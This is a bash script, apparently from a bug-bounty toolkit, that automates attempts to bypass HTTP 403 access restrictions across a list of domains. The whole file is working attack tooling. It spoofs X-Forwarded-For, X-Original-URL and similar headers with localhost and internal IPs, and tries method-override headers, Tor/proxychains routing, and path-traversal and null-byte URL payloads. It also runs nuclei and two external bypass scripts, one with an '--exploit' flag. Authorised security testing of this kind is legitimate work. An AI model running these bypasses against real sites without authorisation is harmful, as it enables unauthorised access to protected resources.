#!/bin/bash
#usgae: ./domain-403.sh domains_without_prefix.txt
#output: bypassed_output_domains.txt

INPUT="$1"
OUTPUT="domain-bypass-out"
> "$OUTPUT"

METHODS=("GET" "POST" "PUT" "DELETE" "OPTIONS" "PATCH" "HEAD")
VERSIONS_HTTP=("--http1.0" "--http1.1")
VERSIONS_HTTPS=("--http1.0" "--http1.1" "--http2")

HEADERS=(
"X-Original-URL"
"X-Real-IP"
"X-Custom-IP-Authorization"
"X-Forwarded-Host"
"X-Originating-IP"
"X-Forwarded-For"
"X-Forwarded"
"Forwarded-For"
"X-Remote-IP"
"X-Remote-Addr"
"X-ProxyUser-Ip"
"Client-IP"
"True-Client-IP"
"Cluster-Client-IP"
"Host"
"X-Original-URL"
"X-ProxyUser-Ip"
"Referer"
)

VALUES=(
"localhost"
"127.0.0.1"
"127.0.0.1:80"
"127.0.0.1:443"
"10.0.0.0"
"10.0.0.1"
"172.16.0.0"
)
 UA="Mozilla/5.0"
 GOOD_CODES="200 201 202 204 205 206 207 208 301 302 307 308"

if [[ ! -f "$INPUT" ]]; then
    echo "[-] Input file not found."
    exit 1
fi

# Phase1
echo -e "\n[*] Phase 1: DIFFERENT( METHODS + VERSIONS +HEADERS )"

while IFS= read -r domain || [[ -n "$domain" ]]; do
    [[ -z "$domain" ]] && continue

    for proto in https http; do
        url="$proto://$domain"
        echo -e "\n[*] Target: $url"

        if [[ "$proto" == "https" ]]; then
            versions=("${VERSIONS_HTTPS[@]}")
        else
            versions=("${VERSIONS_HTTP[@]}")
        fi

        for method in "${METHODS[@]}"; do
            for version in "${versions[@]}"; do
                version_name="${version/--/}"

                [[ "$method" =~ ^(POST|PUT|PATCH)$ ]] && data="--data dummy=1" || data=""

                for header in "${HEADERS[@]}"; do
                    for value in "${VALUES[@]}"; do

                        code=$(curl -sk --connect-timeout 10 --max-time 10 \
                            $version \
                            -X "$method" \
                            -A "$UA" \
                            -H "$header: $value" \
                            -o /dev/null \
                            -w "%{http_code}" \
                            $data \
                            "$url")

                        echo "$method + $version_name + $proto + $header: $value => $code"

                        if echo "$GOOD_CODES" | grep -qw "$code"; then
                            echo "[+] $method + $version_name + $proto + $header: $value => $code @ $url" >> "$OUTPUT"
                        fi

                    done
                done
            done
        done
    done
done < "$INPUT"

echo -e "\n[✔] Scan complete. Bypasses saved to $OUTPUT"

# Phase 2
echo -e "\n[*] Phase 2: Single GET with method override headers"

OVERRIDE_HEADERS=(
"X-HTTP-Method-Override: PUT"
"X-HTTP-Method-Override: DELETE"
"X-HTTP-Method-Override: PATCH"
"X-HTTP-Method-Override: GET"
"X-HTTP-Method-Override: HEAD"
"X-Method-Override: DELETE"
"X-Original-Method: PUT"
)

while IFS= read -r domain || [[ -n "$domain" ]]; do
    [[ -z "$domain" ]] && continue

    for proto in https http; do
        url="$proto://$domain"

        for override in "${OVERRIDE_HEADERS[@]}"; do
            header_name=$(echo "$override" | cut -d':' -f1)
            header_val=$(echo "$override" | cut -d':' -f2-)

            code=$(curl -sk --connect-timeout 10 --max-time 10 \
                -X GET \
                -A "Mozilla/5.0" \
                -H "$header_name: $header_val" \
                -o /dev/null \
                -w "%{http_code}" \
                "$url")

            echo "GET + $proto + $override => $code"

            if echo "$GOOD_CODES" | grep -qw "$code"; then
                echo "[+] GET + $proto + $override  => $code @ $url" >> "$OUTPUT"
            fi
        done
    done
done < "$INPUT"

# Phase 3
echo -e "\n[*] Phase 3: Referer header test"

while IFS= read -r domain || [[ -n "$domain" ]]; do
    [[ -z "$domain" ]] && continue

    for proto in https http; do
        url="$proto://$domain"
        referer="$proto://$domain"

        code=$(curl -sk --connect-timeout 10 --max-time 10 \
            -X GET \
            -A "Mozilla/5.0" \
            -H "Referer: $referer" \
            -o /dev/null \
            -w "%{http_code}" \
            "$url")

        echo "GET + $proto + Referer: $referer => $code"

        if echo "$GOOD_CODES" | grep -qw "$code"; then
            echo "[+] GET + $proto + Referer: $referer => $code @ $url" >> "$OUTPUT"
        fi
    done
done < "$INPUT"

# Phase 4
echo -e "\n[*] Phase 4: Proxychains/VPN bypass test"
sudo systemctl start tor
while IFS= read -r domain || [[ -n "$domain" ]]; do
    [[ -z "$domain" ]] && continue

    for proto in https http; do
        url="$proto://$domain"

        code=$(proxychains curl -sk --connect-timeout 10 --max-time 10 \
            -X GET \
            -A "Mozilla/5.0" \
            -o /dev/null \
            -w "%{http_code}" \
            "$url")

        echo "PROXY + GET + $proto => $code"

        if echo "$GOOD_CODES" | grep -qw "$code"; then
            echo "[+] PROXY + GET + $proto => $code @ $url" >> "$OUTPUT"
        fi
    done
done < "$INPUT"
sudo systemctl stop tor

# Phase 5
echo -e "\n[*] Phase 5: POST with Content-Length: 0 bypass test"

while IFS= read -r domain || [[ -n "$domain" ]]; do
    [[ -z "$domain" ]] && continue

    for proto in https http; do
        url="$proto://$domain"

        code=$(curl -sk --connect-timeout 10 --max-time 10 \
            -X POST \
            -A "Mozilla/5.0" \
            -H "Content-Length: 0" \
            -o /dev/null \
            -w "%{http_code}" \
            "$url")

        echo "POST + Content-Length: 0 + $proto => $code"

        if echo "$GOOD_CODES" | grep -qw "$code"; then
            echo "[+] POST + Content-Length: 0 + $proto => $code @ $url" >> "$OUTPUT"
        fi
    done
done < "$INPUT"

# Phase 6
echo -e "\n[*] Phase 6: Nuclei XFF 403 bypass template"

# Create temp file to hold nuclei output
nuclei_output=$(mktemp)

# Add section header to main output (always)
echo "-----nuclei output: -----" >> "$OUTPUT"

# Run nuclei and capture output
cat "$INPUT" | nuclei \
  -t /home/maddy/nuclei-templates/http/fuzzing/xff-403-bypass.yaml \
  -rl 10 -c 3 -v -o "$nuclei_output"

# Append nuclei results line-by-line (even if empty)
while IFS= read -r line || [[ -n "$line" ]]; do
    echo "[+] Nuclei XFF Bypass => $line" >> "$OUTPUT"
done < "$nuclei_output"

# Always add closing footer
echo "-------------------------" >> "$OUTPUT"

# Clean up
rm "$nuclei_output"
echo -e "\n[*] Phase 7: Path payload bypass test"

# Define the path payloads
path_payloads=(
"." "," "/" "//" "/%2e" "/\/\/\/" "/../" "../" "*" "/./" "%2F" "%2F/" "/*"
"/..;/" "//;//" "/%2e/" "..;/" "/..;/" "/index.php" "/index.html"
"/index%00.html" "/index%00.php" "%00" "/index.php.bak"
"/index.php.txt" "/index.html.bak" "/index.html.txt"
)

# Append section header
echo "-----path payload bypass output: -----" >> "$OUTPUT"

# Process each domain + protocol + payload
while IFS= read -r domain || [[ -n "$domain" ]]; do
    [[ -z "$domain" ]] && continue

    for proto in https http; do
        for payload in "${path_payloads[@]}"; do
            url="$proto://$domain$payload"

            code=$(curl -sk --connect-timeout 10  --path-as-is --max-time 10 \
                -X GET \
                -A "Mozilla/5.0" \
                -o /dev/null \
                -w "%{http_code}" \
                "$url")

            echo "GET $url => $code"

            if echo "$GOOD_CODES" | grep -qw "$code"; then
                echo "[+] PATH PAYLOAD BYPASS => $code @ $url" >> "$OUTPUT"
            fi
        done
    done
done < "$INPUT"

# Phase 7
echo -e "\n[+] Phase 7: Running 403_bypasser.sh for each domain"

while IFS= read -r domain || [[ -n "$domain" ]]; do
    [[ -z "$domain" ]] && continue

    echo -e "\n[+] Running bypass for: $domain"
    echo "-----------403_BYPASS.SH: $domain---------------" >> "$OUTPUT"

    # Run bypasser script, save raw log
    /home/maddy/techiee/bug_bounty/403_bypass/403_bypasser.sh "$domain" / | tee "403_temp_log"

    # Filter useful output and append to main output file
    grep -Ei '\b(200|201|202|203|204|205|206|207|208|209|301|302|500|501|502|307|308)\b' 403_temp_log >> "$OUTPUT"

done < "$INPUT"
echo -e "\n-----------END 403_BYPASS.SH: $domain---------------" >> "$OUTPUT"
rm -f 403_temp_log  # Optional cleanup


# Phase 8
echo -e "\n[+] Phase 8: Running 403-bypasser2.sh for each domain"

while IFS= read -r domain || [[ -n "$domain" ]]; do
    [[ -z "$domain" ]] && continue

    echo -e "\n[+] Running bypass for: $domain"
    echo "-----------403_BYPASS2.SH: $domain---------------" >> "$OUTPUT"

    # Run bypasser script, save raw log
    /home/maddy/techiee/bug_bounty/403_bypass/403-bypasser2.sh -u "$domain" --exploit | tee "403_temp_log"

    # Filter useful output and append to main output file
    grep -Ei '\b(200|201|202|203|204|205|206|207|208|209|301|302|500|501|502|307|308)\b' 403_temp_log >> "$OUTPUT"

done < "$INPUT"
echo -e "\n-----------END 403_BYPASS.SH: $domain---------------" >> "$OUTPUT"
rm -f 403_temp_log  # Optional cleanup
